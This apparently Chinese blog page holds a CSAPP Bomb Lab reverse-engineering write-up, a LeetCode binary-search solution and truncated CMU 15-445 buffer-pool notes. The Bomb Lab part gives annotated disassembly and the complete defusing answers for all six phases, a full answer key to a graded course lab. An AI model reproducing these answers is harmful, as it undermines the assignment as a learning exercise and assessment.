在csapp的网站下载的实验文件有3个，我们需要使用的是bomb文件，以及bomb.c文件， bomb.c文件是用于方便我们了解实验的流程的。 而bomb则是实验的主要内容，使用objdump将它转为汇编代码，然后根据main函数的执行流程一路追踪程序的走向，这个lab总共有6个phase，每一个phase要求我们输入一个字符串，如果字符串不符合要求炸弹就会爆炸，我们需要通过跟踪观察它们的汇编代码来找到正确的字符串。 phase_11234567void phase_1(char* input)&#123; //input in %rdi char* cmp=0x402400; if(strings_not_equal(input,cmp)) //相等返回0，不等返回1 explode_bomb(); //答案错误，炸弹爆炸 return;&#125; 将phase_1对应的汇编代码翻译为C程序。 由C程序可知，phase_1将我们输入的字符串和地址为0x402400的字符串相比较，如果不等则失败，相等则成功，所以我们只要调试得到0x402400处的内容就行。 得到第一个答案“Border relations with Canada have never been better.” phase_2123456789101112131415161718192021222324252627282930313233340000000000400efc &lt;phase_2&gt;: 400efc: 55 push %rbp 400efd: 53 push %rbx 400efe: 48 83 ec 28 sub $0x28,%rsp 400f02: 48 89 e6 mov %rsp,%rsi 400f05: e8 52 05 00 00 callq 40145c &lt;read_six_numbers&gt; ;从我们提供的字符串中读入6个数，如果读出数据个数小于6则爆炸;读出数据存放在(%rsp) 400f0a: 83 3c 24 01 cmpl $0x1,(%rsp) ;比较第一个数是否是1 400f0e: 74 20 je 400f30 &lt;phase_2+0x34&gt; ;第一个数是1，跳转 400f10: e8 25 05 00 00 callq 40143a &lt;explode_bomb&gt; ;第一个数不是1，爆炸 400f15: eb 19 jmp 400f30 &lt;phase_2+0x34&gt; 400f17: 8b 43 fc mov -0x4(%rbx),%eax 400f1a: 01 c0 add %eax,%eax 400f1c: 39 03 cmp %eax,(%rbx) ;比较第i个数是否是第i-1个数的两倍，如果是则继续，不是则爆炸 400f1e: 74 05 je 400f25 &lt;phase_2+0x29&gt; 400f20: e8 15 05 00 00 callq 40143a &lt;explode_bomb&gt; 400f25: 48 83 c3 04 add $0x4,%rbx ;判断下一个数是否满足要求 400f29: 48 39 eb cmp %rbp,%rbx ;如果%rbx&#x3D;%rbp,6个数全部符合要求，通过phase2 400f2c: 75 e9 jne 400f17 &lt;phase_2+0x1b&gt; 400f2e: eb 0c jmp 400f3c &lt;phase_2+0x40&gt; 400f30: 48 8d 5c 24 04 lea 0x4(%rsp),%rbx 400f35: 48 8d 6c 24 18 lea 0x18(%rsp),%rbp ;设置结束位，当%rbx&#x3D;%rbp时，说明字符串符合要求，通过phase2 400f3a: eb db jmp 400f17 &lt;phase_2+0x1b&gt; 400f3c: 48 83 c4 28 add $0x28,%rsp 400f40: 5b pop %rbx 400f41: 5d pop %rbp 400f42: c3 retq 从上述解析中可以得出,要求输入6个数，第一个数为1，后续每一个数是前一个数的两倍，则phase_2的答案是“1 2 4 8 16 32” phase_3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657580000000000400f43 &lt;phase_3&gt;: 400f43: 48 83 ec 18 sub $0x18,%rsp 400f47: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 400f4c: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 400f51: be cf 25 40 00 mov $0x4025cf,%esi 400f56: b8 00 00 00 00 mov $0x0,%eax 400f5b: e8 90 fc ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; ;print 0x4025cf得到字符串&quot;%d %d&quot; ;要求输入2个整数,如果输入的数的个数不对，炸弹爆炸 400f60: 83 f8 01 cmp $0x1,%eax 400f63: 7f 05 jg 400f6a &lt;phase_3+0x27&gt; 400f65: e8 d0 04 00 00 callq 40143a &lt;explode_bomb&gt; 400f6a: 83 7c 24 08 07 cmpl $0x7,0x8(%rsp) ;检测输入的第一个数是否大于7，如果是则炸弹爆炸 400f6f: 77 3c ja 400fad &lt;phase_3+0x6a&gt; 400f71: 8b 44 24 08 mov 0x8(%rsp),%eax 400f75: ff 24 c5 70 24 40 00 jmpq *0x402470(,%rax,8) ;根据第一个数进行跳转(0x402470存放跳转表) ;0x400f7c-&gt;0 ;0x400fb9-&gt;1 ;0x400f83-&gt;2 ;0x400f8a-&gt;3 ;0x400f91-&gt;4 ;0x400f98-&gt;5 ;0x400f9f-&gt;6 ;0x400fa6-&gt;7 400f7c: b8 cf 00 00 00 mov $0xcf,%eax ;当第一个数为0时跳转到此处 400f81: eb 3b jmp 400fbe &lt;phase_3+0x7b&gt; 400f83: b8 c3 02 00 00 mov $0x2c3,%eax ;当第一个数为2时跳转到此处 400f88: eb 34 jmp 400fbe &lt;phase_3+0x7b&gt; 400f8a: b8 00 01 00 00 mov $0x100,%eax ;当第一个数为3时跳转到此处 400f8f: eb 2d jmp 400fbe &lt;phase_3+0x7b&gt; 400f91: b8 85 01 00 00 mov $0x185,%eax ;当第一个数为4时跳转到此处 400f96: eb 26 jmp 400fbe &lt;phase_3+0x7b&gt; 400f98: b8 ce 00 00 00 mov $0xce,%eax ;当第一个数为5时跳转到此处 400f9d: eb 1f jmp 400fbe &lt;phase_3+0x7b&gt; 400f9f: b8 aa 02 00 00 mov $0x2aa,%eax ;当第一个数为6时跳转到此处 400fa4: eb 18 jmp 400fbe &lt;phase_3+0x7b&gt; 400fa6: b8 47 01 00 00 mov $0x147,%eax ;当第一个数为7时跳转到此处 400fab: eb 11 jmp 400fbe &lt;phase_3+0x7b&gt; 400fad: e8 88 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fb2: b8 00 00 00 00 mov $0x0,%eax 400fb7: eb 05 jmp 400fbe &lt;phase_3+0x7b&gt; 400fb9: b8 37 01 00 00 mov $0x137,%eax ;当第一个数为1时跳转到此处 400fbe: 3b 44 24 0c cmp 0xc(%rsp),%eax ;比较第二个数是否等于%eax，如果不等则爆炸，相等则成功拆弹 400fc2: 74 05 je 400fc9 &lt;phase_3+0x86&gt; 400fc4: e8 71 04 00 00 callq 40143a &lt;explode_bomb&gt; 400fc9: 48 83 c4 18 add $0x18,%rsp 400fcd: c3 retq 可以看到，选择不同分支可以得到不同的答案（输入字符串时要写十进制数）,选择其中一个组合就可通过phase_3 第一个数 第二个数 0 0xcf(207) 1 0x137(311) 2 0x2c3(707) 3 0x100(256) 4 0x185(389) 5 0xce(206) 6 0x2aa(682) 7 0x147(327) phase_4123456789101112131415161718192021222324252627282930000000000040100c &lt;phase_4&gt;: 40100c: 48 83 ec 18 sub $0x18,%rsp 401010: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 401015: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 40101a: be cf 25 40 00 mov $0x4025cf,%esi ;和phase_3中一样，0x4025cf处存放字符串&quot;%d %d&quot;和scanf配合使用读入2个数字 40101f: b8 00 00 00 00 mov $0x0,%eax 401024: e8 c7 fb ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 401029: 83 f8 02 cmp $0x2,%eax ;如果读入的数字不是2个，炸弹爆炸 40102c: 75 07 jne 401035 &lt;phase_4+0x29&gt; 40102e: 83 7c 24 08 0e cmpl $0xe,0x8(%rsp) ;如果第一个数小于等于14则继续，否则炸弹爆炸 ;这里是无符号等于，如果第一个数是负数也会爆炸（将补码当作无符号数看） 401033: 76 05 jbe 40103a &lt;phase_4+0x2e&gt; 401035: e8 00 04 00 00 callq 40143a &lt;explode_bomb&gt; 40103a: ba 0e 00 00 00 mov $0xe,%edx 40103f: be 00 00 00 00 mov $0x0,%esi 401044: 8b 7c 24 08 mov 0x8(%rsp),%edi ;%rdi-&gt;第一个数 %rsi-&gt;0 %rdx-&gt;0xe %rcx-&gt;第二个数，进入函数func4 401048: e8 81 ff ff ff callq 400fce &lt;func4&gt; 40104d: 85 c0 test %eax,%eax ;返回值为0则继续，否则炸弹爆炸 40104f: 75 07 jne 401058 &lt;phase_4+0x4c&gt; 401051: 83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) ;第二个数为0则拆弹成功，否则爆炸 401056: 74 05 je 40105d &lt;phase_4+0x51&gt; 401058: e8 dd 03 00 00 callq 40143a &lt;explode_bomb&gt; 40105d: 48 83 c4 18 add $0x18,%rsp 401061: c3 retq 12345678910111213141516171819202122232425262728293031323334350000000000400fce &lt;func4&gt;: ;这个函数涉及到递归，但是只要输出的答案正确，一次调用就能够返回 ;随着func4的递归调用，后续函数调用中%rax和%rcx的内容可能有所不同 ;注释中%rax,%rcx的数值只针对第一次调用的情况 400fce: 48 83 ec 08 sub $0x8,%rsp 400fd2: 89 d0 mov %edx,%eax ;%rax&#x3D;14 400fd4: 29 f0 sub %esi,%eax 400fd6: 89 c1 mov %eax,%ecx ;%rcx&#x3D;14 400fd8: c1 e9 1f shr $0x1f,%ecx ;%rcx&#x3D;0 400fdb: 01 c8 add %ecx,%eax 400fdd: d1 f8 sar %eax ;%eax&#x3D;7 400fdf: 8d 0c 30 lea (%rax,%rsi,1),%ecx ;%rcx&#x3D;7 400fe2: 39 f9 cmp %edi,%ecx ;比较第一个输入的数和%rcx(7)的大小,如果第一个数大于等于%rcx则跳转到0x400ff2执行 ;如果第一个数小于%rcx，则将修改%rdx的值，然后递归调用func4 400fe4: 7e 0c jle 400ff2 &lt;func4+0x24&gt; 400fe6: 8d 51 ff lea -0x1(%rcx),%edx 400fe9: e8 e0 ff ff ff callq 400fce &lt;func4&gt; 400fee: 01 c0 add %eax,%eax 400ff0: eb 15 jmp 401007 &lt;func4+0x39&gt; 400ff2: b8 00 00 00 00 mov $0x0,%eax 400ff7: 39 f9 cmp %edi,%ecx ;比较第一个输入的数和%rcx(7)的大小,如果第一个数小于等于%rcx则func4调用结束，返回0 ;如果第一个数大于%rcx，则将修改%rsi的值，然后递归调用func4 400ff9: 7d 0c jge 401007 &lt;func4+0x39&gt; 400ffb: 8d 71 01 lea 0x1(%rcx),%esi 400ffe: e8 cb ff ff ff callq 400fce &lt;func4&gt; 401003: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401007: 48 83 c4 08 add $0x8,%rsp 40100b: c3 retq 根据上述分析，可以得知fun4用于检验第一个数是否符合要求，根据分析func4一次调用的情况，可以知道当第一个数为7时符合要求，而第二个数则要为0，综上phase_4的答案是“7 0” 对于递归函数func4，我们只考虑了第一次调用就成功返回0的情况，也许通过递归调用，我们能够得到其他答案，为了进一步分析func4，我们将它转化为C程序。 123456789101112int func4(int a,int b,int c,int d)&#123;//%rdi-&gt;a %rsi-&gt;b %rdx-&gt;c %rcx-&gt;d d=c/2+b; if(d&lt;=a)&#123; if(a&lt;=d) return 0; else return 2*func4(a,d+1,c,d)+1; //该分支的返回值一定不等于0，不用考虑 &#125;else&#123; return 2*func4(a,b,d-1,d); &#125;&#125; 在第一次调用时 a=x,b=0,c=14,d=y (x为我们输入的第一个数，y是我们输入的第二个数) 当x=7时，调用1次func4返回0 当x=3时，调用2次func4返回0 当x=1时，调用3次func4返回0 当x=0时，调用4次func4返回0 其他情况都不能使func4满足要求，所以phase_4的最终答案为 “7，0” 或 “3，0” 或 “1，0” 或 “0，0” phase_5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354550000000000401062 &lt;phase_5&gt;: 401062: 53 push %rbx 401063: 48 83 ec 20 sub $0x20,%rsp 401067: 48 89 fb mov %rdi,%rbx 40106a: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401071: 00 00 401073: 48 89 44 24 18 mov %rax,0x18(%rsp) ;设置金丝雀值 401078: 31 c0 xor %eax,%eax 40107a: e8 9c 02 00 00 callq 40131b &lt;string_length&gt; 40107f: 83 f8 06 cmp $0x6,%eax ;如果读入的字符串长度不等于6则爆炸 401082: 74 4e je 4010d2 &lt;phase_5+0x70&gt; 401084: e8 b1 03 00 00 callq 40143a &lt;explode_bomb&gt; 401089: eb 47 jmp 4010d2 &lt;phase_5+0x70&gt; ;循环从40108b开始，循环变量存放在%rax处 40108b: 0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx ;将输入字符串的第%rax个字符(ascii码)写入%rcx 40108f: 88 0c 24 mov %cl,(%rsp) 401092: 48 8b 14 24 mov (%rsp),%rdx ;将输入字符串的第%rax个字符(ascii码)写入%rdx 401096: 83 e2 0f and $0xf,%edx ;将输入字符串的第%rax个字符(ascii码)与0xf想与后写入%rdx 401099: 0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx ;根据%rdx的内容访问字符表 4010a0: 88 54 04 10 mov %dl,0x10(%rsp,%rax,1) ;将从跳转表中取出的字符传入以rsp+0x10为初值的第%rax个字符处 4010a4: 48 83 c0 01 add $0x1,%rax 4010a8: 48 83 f8 06 cmp $0x6,%rax ;当循环执行6次则跳出 4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; ;将rsp+0x10开始的6个字符(循环中从字符表取出的6个字符)和0x40245e的6个字符比较 ;0x40245e-&gt;&quot;flyers&quot; ;如果不等则炸弹爆炸 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt; 4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; 4010cb: 0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0: eb 07 jmp 4010d9 &lt;phase_5+0x77&gt; 4010d2: b8 00 00 00 00 mov $0x0,%eax ;for循环中，初始化%eax&#x3D;0 4010d7: eb b2 jmp 40108b &lt;phase_5+0x29&gt; 4010d9: 48 8b 44 24 18 mov 0x18(%rsp),%rax 4010de: 64 48 33 04 25 28 00 xor %fs:0x28,%rax ;比对金丝雀值查看是否存在缓冲区溢出 4010e5: 00 00 4010e7: 74 05 je 4010ee &lt;phase_5+0x8c&gt; 4010e9: e8 42 fa ff ff callq 400b30 &lt;__stack_chk_fail@plt&gt; 4010ee: 48 83 c4 20 add $0x20,%rsp 4010f2: 5b pop %rbx 4010f3: c3 retq 根据上述的代码分析我们可以知道，这段程序首先会检查我们输入的字符串长度，要求字符串长度为6个字符才能继续执行，然后会根据我们输入的每个字符的ascii码的低4位查询位于0x4024b0的字符表，这样可以映射得到新的一串字符(长度同样为6)，最后将其与字符串”flyers”比对，如果相等则拆弹成功。 我们要使映射字符表得到的新字符串等于”flyers”，首先需要知道字符表的内容。 字符表 相对于0x4024b0的偏移 字符内容 0 m 1 a 2 d 3 u 4 i 5 e 6 r 7 s 8 n 9 f 10 o 11 t 12 v 13 b 14 y 15 l 要想根据上表得到”flyers”，我们的六个字符的ascii码的低4位分别位9,f,e,5,6,7 任意取一个高位，假设我们取高4位为6，则对应的ascii码为0x6x（x取上面这6个数） 例如第一个字符就等于0x69–&gt;’ i ‘,以此类推得到字符串为”ionefg” 则字符串”ionefg”为phase_5的一个答案。 phase_6123456789101112131415161718192021222324252627282930313233343500000000004010f4 &lt;phase_6&gt;: 4010f4: 41 56 push %r14 4010f6: 41 55 push %r13 4010f8: 41 54 push %r12 4010fa: 55 push %rbp 4010fb: 53 push %rbx 4010fc: 48 83 ec 50 sub $0x50,%rsp 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; ;读入6个数 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax ;每一个读入的数都要在1~6之间 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; 401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt; 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt; 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; ;循环判断，要求每一个数与其他数互不相等 123456789101112401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi401158: 4c 89 f0 mov %r14,%rax40115b: b9 07 00 00 00 mov $0x7,%ecx401160: 89 ca mov %ecx,%edx401162: 2b 10 sub (%rax),%edx401164: 89 10 mov %edx,(%rax)401166: 48 83 c0 04 add $0x4,%rax40116a: 48 39 f0 cmp %rsi,%rax40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt;40116f: be 00 00 00 00 mov $0x0,%esi401174: eb 21 jmp 401197 &lt;phase_6+0xa3&gt;;对于每一个数x，将其转换为7-x 以我的水平只能翻译到这里，后面的访存，跳转操作实在太绕了，我思路完全理不清，所以参考了网上一些大佬的文章，看了看思路，最后勉强理解的整体流程。 下面是后续部分的代码解析（参考:https://zhuanlan.zhihu.com/p/28422249） 12345678910111213141516171819202122232425401176: 48 8b 52 08 mov 0x8(%rdx),%rdx40117a: 83 c0 01 add $0x1,%eax40117d: 39 c8 cmp %ecx,%eax40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt;401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt;401183: ba d0 32 60 00 mov $0x6032d0,%edx401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2)40118d: 48 83 c6 04 add $0x4,%rsi401191: 48 83 fe 18 cmp $0x18,%rsi401195: 74 14 je 4011ab &lt;phase_6+0xb7&gt;401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx40119a: 83 f9 01 cmp $0x1,%ecx40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt;40119f: b8 01 00 00 00 mov $0x1,%eax4011a4: ba d0 32 60 00 mov $0x6032d0,%edx4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt;;将6个数一一做判断，对于第i个数（从0开始）,根据它的大小不同，将不同数存入(rsp+20+8i)中。;具体映射情况如下;1-&gt;0x6032d0;2-&gt;0x6032e0;3-&gt;0x6032f0;4-&gt;0x603300;5-&gt;0x603310;6-&gt;0x603320 1234567891011121314151617184011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi4011ba: 48 89 d9 mov %rbx,%rcx4011bd: 48 8b 10 mov (%rax),%rdx4011c0: 48 89 51 08 mov %rdx,0x8(%rcx)4011c4: 48 83 c0 08 add $0x8,%rax4011c8: 48 39 f0 cmp %rsi,%rax4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt;4011cd: 48 89 d1 mov %rdx,%rcx4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt;4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx)4011d9: 00 ;这一段代码将我们刚刚存入的(rsp+20)~(rsp+48)六个数字的对应地址进行操作;假设(rsp+0x20)&#x3D;x,则(x+8)&#x3D;(rsp+0x28);依次类推（rsp+n)&#x3D;y,则(y+8)&#x3D;(rsp+n+8)，其中0x20&lt;&#x3D;n&lt;&#x3D;0x48;而对于(rsp+0x50)而言，若(rsp+0x50)&#x3D;z,则（z+8)&#x3D;0 文字描述: 栈顶的值为地址+8后寻址到的值为栈里第二个值，第二个值为地址+8后寻址到的值为栈里第三个 值，以此类推，栈里第六个值为地址+8后寻址到的是0. 最后这两段的代码建议自己画图跟着流程走一遍，不然容易被绕晕。 最后一段代码是对上面这段代码执行结果的检验。 123456789101112131415161718194011da: bd 05 00 00 00 mov $0x5,%ebp4011df: 48 8b 43 08 mov 0x8(%rbx),%rax4011e3: 8b 00 mov (%rax),%eax4011e5: 39 03 cmp %eax,(%rbx)4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt;4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt;4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx4011f2: 83 ed 01 sub $0x1,%ebp4011f5: 75 e8 jne 4011df &lt;phase_6+0xeb&gt;4011f7: 48 83 c4 50 add $0x50,%rsp4011fb: 5b pop %rbx4011fc: 5d pop %rbp4011fd: 41 5c pop %r124011ff: 41 5d pop %r13401201: 41 5e pop %r14401203: c3 retq ;做5次循环判断，%rbx初始存的是栈顶的值;对这个值+8后作为地址寻址到的值再寻址后得到的值，小于这个值自身作为地址寻址到的值，就可以跳过炸弹;然后对栈里5组关系都要满足才能通关。 1234567//对最后一段汇编代码进行大致的翻译//rbx初始化为&quot;栈顶的值&quot;(对(rsp+20)访存)for(int i=0;i&lt;5;i++)&#123; if(*(*(rbx+8))&gt;=*(rbx)) bomb(); rbx=*(rbx+8);&#125; 这一段可以理解为输入的六个数翻转后对应的地址中的值，是按照递减顺序排列的（见下图） 6个地址存的值 地址 值 翻转后的值(7-x) 输入值(x) 0x6032d0 332 1 6 0x6032e0 168 2 5 0x6032f0 924 3 4 0x603300 691 4 3 0x603310 477 5 2 0x603320 443 6 1 根据要求，我们的输入值的顺序要按照值的大小递减输入， 即phase_6答案为“4 3 2 1 6 5” 程序运行结果:","categories":[{"name":"csapp","slug":"csapp","permalink":"http://yoursite.com/categories/csapp/"}],"tags":[]},{"title":"Leetcode周赛 6.14","slug":"leetcode周赛-6-14","date":"2020-06-16T09:21:01.000Z","updated":"2020-08-30T04:00:00.687Z","comments":true,"path":"2020/06/16/leetcode周赛-6-14/","link":"","permalink":"http://yoursite.com/2020/06/16/leetcode%E5%91%A8%E8%B5%9B-6-14/","excerpt":"","text":"5438.制作m束花所需的最少天数给你一个整数数组 bloomDay，以及两个整数 m 和 k 。 现需要制作 m 束花。制作花束时，需要使用花园中 相邻的k朵花 。 花园中有 n 朵花，第 i朵花会在 bloomDay[i] 时盛开，恰好 可以用于 一束 花中。 请你返回从花园中摘 m 束花需要等待的最少的天数。如果不能摘到 m 束花则返回 -1 。 示例 1： 输入：bloomDay = [1,10,3,10,2], m = 3, k = 1输出：3解释：让我们一起观察这三天的花开过程，x 表示花开，而 _ 表示花还未开。现在需要制作 3 束花，每束只需要 1 朵。1 天后：[x, _, _, _, _] // 只能制作 1 束花2 天后：[x, _, _, _, x] // 只能制作 2 束花3 天后：[x, _, x, _, x] // 可以制作 3 束花，答案为 3 示例 2： 输入：bloomDay = [1,10,3,10,2], m = 3, k = 2输出：-1解释：要制作 3 束花，每束需要 2 朵花，也就是一共需要 6 朵花。而花园中只有 5 朵花，无法满足制作要求，返回 -1 。 示例 3： 输入：bloomDay = [7,7,7,7,12,7,7], m = 2, k = 3输出：12解释：要制作 2 束花，每束需要 3 朵。花园在 7 天后和 12 天后的情况如下：7 天后：[x, x, x, x, _, x, x]可以用前 3 朵盛开的花制作第一束花。但不能使用后 3 朵盛开的花，因为它们不相邻。12 天后：[x, x, x, x, x, x, x]显然，我们可以用不同的方式制作两束花。 示例 4： 输入：bloomDay = [1000000000,1000000000], m = 1, k = 1输出：1000000000解释：需要等 1000000000 天才能采到花来制作花束 示例 5： 输入：bloomDay = [1,10,2,9,3,8,4,7,5,6], m = 4, k = 2输出：9 提示： bloomDay.length == n 1&lt;=n&lt;=10^5 1&lt;=bloomDay[i]&lt;=10^9 1&lt;=m&lt;=10^6 1&lt;=k&lt;=n 思路: 这题真的想了非常久，最简单的想法就是按天数递增，每天判断一次是否满足要求，但是一看数据范围就直到这么简单的暴力必然超时。 然后就想着能不能将bloomDay划分出m个子数组，每个数组含k个元素，最终取出这些子数组内的元素最大值，但是这个思路实现起来很困难，因为m*k&lt;bloomDay.size() （多数情况这个式子是满足的，这样的话我们很难确定划分出的这个子数组是否是正确的。 假设一组数据 bloomDay=[8,7,6,1,1,1,6,7,8] m=2, k=3 我们需要从boolmDay数组中划分出2个子数组，每个子数组含3个元素，那么要怎么划分呢？ 直觉上来说应该先划分出[1,1,1]，因为它是最小的 但是这样结果就是[1,1,1]和[8,7,6] 或是[1,1,1]和[6,7,8]这两种组合，最终结果都是8 但这一组数据的正确划分应该是[7,6,1]和[1,1,6]，结果是7 从这个例子可以发现，在划分某个子数组过程中，我们难以判断本次划分是否正确，必须等到我们把全部子数组划分结束后才能得到结果，且这个结果还需要与其他划分方式进行比对，取最小值。 要枚举出所有划分子数组的方法是必然会超时的 所以绕了半天好像还是没有越过超时的坎。 最后我是采用二分的思路解决这题的（大概率不是最优 步骤如下: 1.对天数进行二分处理，初始时minday=1，maxday=1e9 （根据1&lt;=bloomDay[i]&lt;=10^9) mid=minday+（maxday-minday）/2 2.在每一次二分过程中判断在mid这一天之前盛开的花是否能够满足我们的需求 3.如果花的数量满足需要则maxday=mid，如果不满足需要则minday=mid+1， 4.当minday&gt;=maxday时退出二分循环，这时minday就是我们要找的答案 这种做法其实也是一种暴力，只是通过二分的思路将时间消耗降低到了可接受范围之内时间复杂度，空间复杂度 代码 123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123;public: &#x2F;&#x2F;二分搜索 int minDays(vector&lt;int&gt;&amp; bloomDay, int m, int k) &#123; long long sum&#x3D;m*k; int len&#x3D;bloomDay.size(); if(sum&gt;len) return -1; &#x2F;&#x2F;m*k&gt;len 花的数量不够 int minday&#x3D;1,maxday&#x3D;1e9; while(minday&lt;maxday)&#123; int mid&#x3D;minday+(maxday-minday)&#x2F;2; int ok&#x3D;false; int cal&#x3D;0; int tmpm&#x3D;0; for(int i&#x3D;0;i&lt;len;i++)&#123; &#x2F;&#x2F;判断这一天是否满足要求 if(bloomDay[i]&lt;&#x3D;mid)&#123; cal++; &#125; else cal&#x3D;0; if(cal&#x3D;&#x3D;k)&#123; tmpm++; cal&#x3D;0; if(tmpm&#x3D;&#x3D;m)&#123; &#x2F;&#x2F;满足要求，提前退出循环 ok&#x3D;true; break; &#125; &#125; &#125; if(ok) maxday&#x3D;mid; else minday&#x3D;mid+1; &#125; return minday; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"CMU15-445学习笔记-缓冲池和内存管理","slug":"cmu15-445-缓冲池和内存管理","date":"2020-05-27T15:04:31.000Z","updated":"2020-08-30T04:04:08.499Z","comments":true,"path":"2020/05/27/cmu15-445-缓冲池和内存管理/","link":"","permalink":"http://yoursite.com/2020/05/27/cmu15-445-%E7%BC%93%E5%86%B2%E6%B1%A0%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","excerpt":"","text":"Bifurcated environment（分叉环境？） 以上是目前许多公司的标准配置，它们有前端的OLTP数据库以及后端大型数据仓库，前端的OLTP数据库通常会被称为Data silo（数据孤岛，即相互独立的数据存储区），因为我们可以对其中一个数据库实例进行许多更新操作，并将其应用到此处的单个逻辑数据库中（Data silo），但这些前端数据库之间不会互相交流，它们每一个都是独立于其他数据库的一个“孤岛”。 从前端的OLTP数据库中得到数据后，我们会进行一种称为ETL（ETL是将业务系统的数据经过抽取，清洗转换后加载到数据仓库的过程）的操作，然后在数据仓库（OLAP数据库）中对这些数据进行分析，最后将分析得到的新信息再返回给OLTP数据库，通过OLTP数据库将这些新信息向外暴露。 HTAP（上节课提到的一种混合模式的workload）的理念是，让前端的OLTP数据库也能够完成一些原先在OLAP端所做的分析行为。但我们仍然需要后端的大型数据仓库（OLAP），因为前端的OLTP数据库只能根据自己所拥有的数据进行少量分析行为，且由于它们互相之间是“孤岛”，所以我们只能在后端的数据仓库中看到所有的OLTP数据库中的数据，并对它们一起进行分析。 概述数据库无法直接在磁盘上进行操作，由于冯诺伊曼架构，我们只能对内存中的数据进行读写，所以这节课我们会学习我们如何将磁盘中的数据库文件或是page放到内存中，以便我们能够对它们进行操作。 我们希望能够去支持超出我们内存容量大小的数据库，同时也希望能够最小化磁盘执行查询速度缓慢带来的影响，我们希望这些操作就像在内存中进行的那样。 我们可以从空间和时间的管理上来思考这个问题。 空间管理空间管理是指我们将数据写入在磁盘的什么地方，依照磁盘的特性，我们希望尽可能的将经常使用的page连续的存放，当我们对这些page读写的时候，由于它们的物理位置彼此靠近，我们就无须花费过多时间用于查找它们在磁盘上的位置。 时间管理时间管理指我们在什么时候将page读入内存，另一方面，当这些page被修改后，我们也需要将它们写回磁盘，我们需要决定何时执行这些操作。 总而言之，我们希望最小化将数据库存放在磁盘给我们带来的许多负面影响。 执行流程 前面两节课我们讨论了如何在磁盘中表示数据，现在我们要讨论图中内存中的Buffer Pool这一部分。当上层请求读取page2时，我们会同过page目录找到page2，并将其送入内存。但是我们的内存容量是远小于外存的，必然会出现Buffer Pool已满，但是我们仍然需要向磁盘中读入新的page这种情况。这时我们就需要将一些在Buffer Pool中的page写出，这样就能够有空闲的空间读入新的page。 这就要求我们需要决定对那些page执行写出操作，这是今天这节课的重点讨论内容。 Buffer Pool管理器Buffer Pool需要系统分配一块很大的内存空间，因此才能够将page从磁盘中读入。但是注意，这一块内存空间是完全由数据库系统来控制的，而不是OS。 我们将这块大的内存空间分成一个个固定大小的chunk，它被称为frame。我们会将从磁盘中读入的一个page放入一个frame中，我个人认为frame是内存中的页框，专门用于装入page。 当数据库请求得到一个page时，Buffer Pool具体做了哪些事呢？ 首先是查看Buffer 